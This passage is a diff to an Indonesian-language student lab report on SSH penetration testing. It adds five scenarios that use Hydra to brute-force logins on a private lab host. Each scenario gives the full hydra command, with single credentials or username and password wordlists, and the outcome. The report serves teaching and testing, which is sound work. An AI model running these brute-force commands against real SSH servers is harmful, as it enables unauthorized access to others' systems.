@@ -343,12 +343,38 @@ Pada tahap uji penetrasi tanpa defense ini akan ada 5 skenario :
 
 2.username="root"   password="admin"      (username salah)
 
-3.file username_benar.txt file passwordbenar.txt
+3.file username_benar.txt file password_benar.txt
 
-4.file username_benar.txt file passwordsalah.txt
+4.file username_benar.txt file password_salah.txt
 
-5.file username_salah.txt file passwordsalah.txt
+5.file username_salah.txt file password_salah.txt
 
 * **Hydra**
+
+  **1.**username="adnan"   password="admin"     (benar)
+  
+  Perintah:"hydra -l adnan -p admin -s 5000 10.151.43.5 ssh" successfully 1 valid password found
+  ![alt text](https://github.com/panagua/PKSJ_Kelompok_x/blob/master/Hydra/1.PNG)
+  
+  **2.**username="root"   password="admin"     (username salah)
+  
+  Perintah:"hydra -l root -p admin -s 5000 10.151.43.5 ssh" 0 valid password found
+  ![alt text](https://github.com/panagua/PKSJ_Kelompok_x/blob/master/Hydra/2.PNG)
+  
+  **3.**file username_benar.txt  file password_benar.txt
+  
+  Perintah:"hydra -L username_benar.txt -P password_benar.txt -s 5000 10.151.43.5 ssh" succesfully
+  ![alt text](https://github.com/panagua/PKSJ_Kelompok_x/blob/master/Hydra/3.PNG)
+  
+  **4.**file username_benar.txt  file password_salah.txt
+  
+  Perintah:"hydra -L username_benar.txt -P password_salah.txt -s 5000 10.151.43.5 ssh" 0 valid password found
+  ![alt text](https://github.com/panagua/PKSJ_Kelompok_x/blob/master/Hydra/4.PNG)
+  
+  **5.**file username_salah.txt  file password_salah.txt
+  
+  Perintah:"hydra -L username_salah.txt -P password_salah.txt -s 5000 10.151.43.5 ssh" 0 valid password found
+  ![alt text](https://github.com/panagua/PKSJ_Kelompok_x/blob/master/Hydra/5.PNG)
+
 
     
